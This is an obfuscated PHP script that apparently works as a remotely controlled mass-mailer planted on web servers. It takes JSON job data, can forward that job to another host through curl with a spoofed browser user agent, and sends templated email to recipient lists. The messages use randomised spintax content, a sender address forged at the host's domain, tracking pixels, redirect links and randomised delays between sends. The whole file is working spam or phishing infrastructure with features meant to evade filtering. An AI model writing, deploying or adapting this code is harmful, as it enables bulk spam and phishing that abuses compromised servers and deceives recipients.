<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spfd4e4d) { if ($spfd4e4d == 'keys') { return array_keys($this->_keys); } } public function Import($spfd4e4d, $spa5a7ab) { if (is_array($spa5a7ab)) { $this->values[$spfd4e4d] = array(); foreach ($spa5a7ab as $spcc59b9) { if (!empty($spcc59b9['key'])) { $this->values[$spfd4e4d][$spcc59b9['key']] = $spcc59b9['value']; } else { $this->values[$spfd4e4d][] = $spcc59b9['value']; } } } else { $this->Assign($spfd4e4d, $spa5a7ab); } } public function Assign($spfd4e4d, $sp9feb97) { $this->values[$spfd4e4d] = $sp9feb97; } public function Parse($sp31cc35) { $spec480c = ''; $spd5893a = 0; while (true) { $spc6a6c7 = strpos($sp31cc35, '{', $spd5893a); if ($spc6a6c7 === false) { $spec480c .= substr($sp31cc35, $spd5893a); break; } $spec480c .= substr($sp31cc35, $spd5893a, $spc6a6c7 - $spd5893a); $spd5893a = $spc6a6c7 + 1; $sp047adb = ''; $sp08b5cb = '{'; $sp6f7446 = array(); $spf4efeb = false; $spa216c7 = false; $spea04fa = 'var'; while ($spd5893a < strlen($sp31cc35)) { $sp00a453 = substr($sp31cc35, $spd5893a, 1); $sp08b5cb .= $sp00a453; if ($sp00a453 == ',' || $sp00a453 == '>' || $sp00a453 == '|') { if ($spea04fa == 'alias') { $spf4efeb = $sp047adb; } elseif ($spea04fa == 'mod') { $spa216c7 = $sp047adb; } else { $sp6f7446[] = $sp047adb; } $sp047adb = ''; if ($sp00a453 == '>') { $spea04fa = 'alias'; } if ($sp00a453 == '|') { $spea04fa = 'mod'; } $spd5893a++; continue; } if ($sp00a453 == '}') { if ($spea04fa == 'alias') { $spf4efeb = $sp047adb; } elseif ($spea04fa == 'mod') { $spa216c7 = $sp047adb; } else { $sp6f7446[] = $sp047adb; } $spd5893a++; break; } $sp047adb .= $sp00a453; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp00a453) == 0) { $spd5893a++; $sp6f7446 = array(); break; } $spd5893a++; } if (sizeof($sp6f7446) == 0) { $spec480c .= $sp08b5cb; continue; } $sp124d7e = false; $sp84952e = false; if (preg_match('/^\\^/', $sp6f7446[0]) > 0) { $sp6f7446[0] = substr($sp6f7446[0], 1); $sp124d7e = true; } if (preg_match('/^\\!/', $sp6f7446[0]) > 0) { $sp6f7446[0] = substr($sp6f7446[0], 1); $sp84952e = true; } $sp88c13c = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp6f7446[0], $sp46d0cb) > 0) { $sp88c13c = $sp46d0cb[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp6f7446[0], $sp46d0cb) > 0) { $sp88c13c = explode('-', $sp46d0cb[1]); } if ($sp88c13c !== false) { $sp6f7446[0] = substr($sp6f7446[0], 0, strpos($sp6f7446[0], '[')); } $this->_keys[$sp6f7446[0]] = true; if (empty($this->values[$sp6f7446[0]]) && empty($this->fixed[$sp6f7446[0]])) { continue; } if ($sp124d7e) { unset($this->fixed[$sp6f7446[0]]); } if (isset($this->fixed[$sp6f7446[0]])) { $sp401645 = $this->fixed[$sp6f7446[0]]; } else { $sp401645 = ''; $spb6dfab = 1; if (sizeof($sp6f7446) == 2) { $spb6dfab = $sp6f7446[1]; } if (sizeof($sp6f7446) == 3) { $spb6dfab = rand($sp6f7446[1], $sp6f7446[2]); } for ($sp539138 = 0; $sp539138 < $spb6dfab; $sp539138++) { if (is_array($this->values[$sp6f7446[0]])) { if (!is_array($this->used[$sp6f7446[0]])) { $this->used[$sp6f7446[0]] = array(); } if (count($this->used[$sp6f7446[0]]) == count($this->values[$sp6f7446[0]])) { $this->used[$sp6f7446[0]] = array(); } if ($sp88c13c !== false && is_scalar($sp88c13c)) { $sp401645 .= $this->values[$sp6f7446[0]][$sp88c13c]; $this->used[$sp88c13c] = true; } else { $spf0e282 = array(); if (is_array($sp88c13c)) { $spf86cbb = $sp88c13c[0]; $spdeaffa = $sp88c13c[1]; } else { $spf86cbb = 0; $spdeaffa = count($this->values[$sp6f7446[0]]) - 1; } for ($sp156f7b = $spf86cbb; $sp156f7b <= $spdeaffa; $sp156f7b++) { if ($sp84952e && !empty($this->used[$sp6f7446[0]][$sp156f7b])) { continue; } $spf0e282[] = $sp156f7b; } $spa03829 = $spf0e282[rand(0, count($spf0e282) - 1)]; $this->used[$sp6f7446[0]][$spa03829] = true; $sp401645 .= $this->values[$sp6f7446[0]][$spa03829]; } } else { $sp401645 .= $this->values[$sp6f7446[0]]; } } } $sp401645 = $this->Parse($sp401645); if ($spa216c7 !== false) { for ($spf161a7 = 0; $spf161a7 < strlen($spa216c7); $spf161a7++) { switch (substr($spa216c7, $spf161a7, 1)) { case 'b': $sp401645 = base64_encode($sp401645); break; case 'q': $sp401645 = quoted_printable_encode($sp401645); break; default: break; } } } if ($sp124d7e) { $this->fixed[$sp6f7446[0]] = $sp401645; } if ($spf4efeb !== false && $spf4efeb != '') { $this->fixed[$spf4efeb] = $sp401645; } $spec480c .= $sp401645; } return $spec480c; } } $sp33fd73 = file_get_contents('php://input'); $sp291681 = json_decode($sp33fd73, true); if (empty($sp291681['via_proxy'])) { $sp291681['via_proxy'] = true; $sp282b6e = curl_init($sp291681['prefix'] . $sp291681['files']['s']); $sp3a6cca = json_encode($sp291681); curl_setopt($sp282b6e, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp282b6e, CURLOPT_TIMEOUT, 600); curl_setopt($sp282b6e, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp282b6e, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp282b6e, CURLOPT_REFERER, $sp901648); curl_setopt($sp282b6e, CURLOPT_POST, true); curl_setopt($sp282b6e, CURLOPT_POSTFIELDS, $sp3a6cca); curl_setopt($sp282b6e, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp3a6cca))); $sp60ea0b = curl_exec($sp282b6e); echo $sp60ea0b; die; } $sp984eae = $_SERVER['SERVER_ADDR']; $sp2e2d26 = $_SERVER['HTTP_HOST']; $sp2e2d26 = preg_replace('/^www\\./', '', $sp2e2d26); $sp392d4d = new Macros(); $sp392d4d->Assign('server_addr', $sp984eae); $sp392d4d->Assign('server_host', $sp2e2d26); foreach ($sp291681['macros'] as $spfd4e4d => $spa5a7ab) { $sp392d4d->Import($spfd4e4d, $spa5a7ab); } $sp8becbf = preg_replace('/^www\\./i', '', $sp2e2d26); $sp14984b = $sp392d4d->Parse('{from_user}@' . $sp8becbf); $sp392d4d->Assign('from_email', $sp14984b); $sp392d4d->Assign('prefix', $sp291681['prefix']); $sp392d4d->Assign('html', $sp291681['letter']['html']); $spd5893a = 0; $spdde8b3 = 0; $sp79e8e7 = 0; $sp4263bc = array(); foreach ($sp291681['rcpt'] as $sp1dfbbd) { $sp392d4d->Assign('email', $sp1dfbbd['email']); $sp392d4d->Assign('entry', $sp1dfbbd); $sp392d4d->Assign('date', date('r')); $sp392d4d->Assign('redirect', $sp291681['prefix'] . $sp291681['files']['r']); $sp392d4d->Assign('redirect_with_uri', $sp291681['prefix'] . $sp291681['files']['r'] . '?uri='); $sp392d4d->Assign('unsubscribe', $sp291681['prefix'] . $sp291681['files']['u'] . '?id=' . $sp1dfbbd['id']); $sp392d4d->Assign('delivery', '<img src="' . $sp291681['prefix'] . $sp291681['files']['d'] . '?id=' . $sp1dfbbd['id'] . '" />'); $sp4559fc = $sp392d4d->Parse($sp291681['envelope']['header']); $sp1a8bb4 = $sp392d4d->Parse($sp291681['envelope']['body']); if (!empty($sp1dfbbd['name'])) { $spa87d1d = $sp1dfbbd['name'] . ' <' . $sp1dfbbd['email'] . '>'; } else { $spa87d1d = $sp1dfbbd['email']; } $sp3cbe9d = $sp392d4d->Parse($sp291681['letter']['subject']); if ($spd5893a > 0) { sleep(rand(3, 8)); } $spbc3766 = mail($spa87d1d, $sp3cbe9d, $sp1a8bb4, $sp4559fc); $sp4263bc[$sp1dfbbd['id']] = $spbc3766; if ($spbc3766) { $spdde8b3++; } else { $sp79e8e7++; } $spd5893a++; } echo serialize(array('total' => count($sp291681['rcpt']), 'sent' => $spd5893a, 'success' => $spdde8b3, 'error' => $sp79e8e7, 'rcpt' => $sp4263bc));